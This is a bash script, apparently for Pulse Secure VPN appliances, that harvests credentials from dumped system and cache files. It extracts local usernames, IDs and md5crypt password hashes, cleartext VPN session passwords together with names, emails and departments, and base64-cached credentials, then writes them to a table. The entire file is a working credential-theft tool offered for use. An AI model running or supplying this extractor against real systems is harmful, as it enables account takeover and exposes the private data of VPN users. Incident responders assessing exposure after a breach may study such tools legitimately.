#!/bin/bash
# Special Thanks for Jon Williams from Bishopfox.
# legit pulse secure credential extractor!
# tips :
# while true; do user=$(ps -x | grep "grep -A 10" | awk {'print $8'} | head -n 1 | grep -v "CVS");if [ "$user" != "" ];then cat ./._users -n | grep "$user";sleep 1;else sleep 1; fi;done
if [ -z "$3" ]; then
    echo "f*ck, how many i will tell you sh*s!"
    echo "bash $0 <hash> <plain> <out>"
    exit
fi
tsystem=$1
tplain=$2
toutput=$3

echo "Extracting local user details..."
strings ${tsystem} | grep "^login_" | cut -c7- | sort -u >./._users
>./._uids
>./._hash
while IFS= read -r line; do
  strings ${tsystem} | grep -A 4 "login_$line" | grep -m 1 useruid | cut -c8- | cut -c -40 | echo "$line:$(cat)" >>./._uids
  strings ${tsystem} | grep -A 10 "$line" | grep -m 1 danastre | echo "$line:$(cat)" >>./._hash
done<./._users
sort -u ./._uids -o ./._uids
sort -u ./._hash -o ./._hash
(
  echo "Username	Unique ID	Password Hash (md5crypt)"
  echo "--------	---------	------------------------"
  while IFS= read -r uname; do
    uuid=$(grep "$uname:" ./._uids | cut -d ':' -f 2)
    uhash=$(grep "$uname:" ./._hash | cut -d ':' -f 2)
    echo "$uname	$uuid	$uhash"
  done < ./._users
) | column -ts $'\t' >>${toutput}
echo "" >>${toutput}


echo "Extracting observed VPN logins..."
echo "Observed VPN Logins:" >>${toutput}
# Look for cached VPN client session authentication details. This will
#  capture local and external authentications in clear text).
(
  echo "Username	Password	Name	Email	Login Time"
  echo "--------	--------	----	----- 	----------"
  strings ${tsystem} ${tplain} | grep -A 35 user@ >./._login
  echo "--" >>./._login
  username=""
  password=""
  name=""
  email=""
  userdn=""
  department=""
  homedir=""
  timestamp=""
  lastuser=""
  while IFS= read -r line; do
    if [[ "$username" != "$lastuser" ]]; then
      # Print session details (not all captured information is shown by default)
      echo "$lastuser	$password	$name	$email	$timestamp $department"
      lastuser="$username"
      password=""
      name=""
      email=""
      userdn=""
      department=""
      homedir=""
      timestamp=""
    else
      #get the details
      if [[ ! $line =~ user@|userName|userAttr|userDN|localdomain|lastLogin|protocol|password@|^password$|^[0-9]+$|^[a-fA-F0-9]{32}$ ]]; then
        case "$last" in
          user@*|sAMAccountName)
            username=$(echo "$line" | awk '{print tolower($0)}')
            if [ -z "$lastuser" ]; then
              lastuser="$username"
            fi
            ;;
          password@*)
            if [ -z "$password" ]; then
              password="$line"
            fi
            ;;
          mail)
            if [ -z "$email" ]; then
              email="$line"
            fi
            ;;
          userDN@*)
            if [ -z "$name" ]; then
              name="$line"
            fi
            ;;
          userDNText@*)
            if [ -z "$userdn" ]; then
              userdn="$line"
            fi
            ;;
          department)
            if [ -z "$department" ]; then
              department="$line"
            fi
            ;;
          homeDirectory)
            if [ -z "$homedir" ]; then
              homedir="$line"
            fi
            ;;
          radSessionID)
            if [ -z "$timestamp" ]; then
              timestamp=$(echo "$line" | cut -d '"' -f 2)
            fi
            ;;
          *)
            ;;
        esac
      fi
    fi
    last="$line"
  done <./._login
  # Make sure we print the last entry
  if [ -n "$username" ]; then
    echo "$username	$password	$name	$email	$timestamp"
  fi

  # Look for any other usernames and passwords cached in base64
  if [[ $(echo "YQ==" | base64 -d 2>/dev/null) == "a" ]]; then
    b64="d" # GNU base64
  else
    b64="D" # Mac base64
  fi
  strings ${tsystem} ${tplain} | grep -A1 "\!PRIMARY\!" | grep -Ev "^\!PRIMARY\!$|NTLM" | sed '/^--$/d' | while IFS= read -r line; do # gets base64 strings from the same line with !PRIMARY! or on the following line
    i=0
    oldval=""
    newval=""
    valid=1
    while [ $valid -eq 1 ]; do
      let "i+=4"
      oldval="$newval"
      newval=$(echo "${line: -$i}" | base64 -$b64 2>/dev/null)
      if [[ "$newval" == "" ]] || [[ $newval = *[![:ascii:]]* ]]; then
        valid=0
        if [[ "$oldval" != "" ]]; then
          echo "$oldval"
        fi
      fi
    done
  done | sort -u | sed 's/:/	/g'
) | column -ts $'\t' >>${toutput}
rm ./._*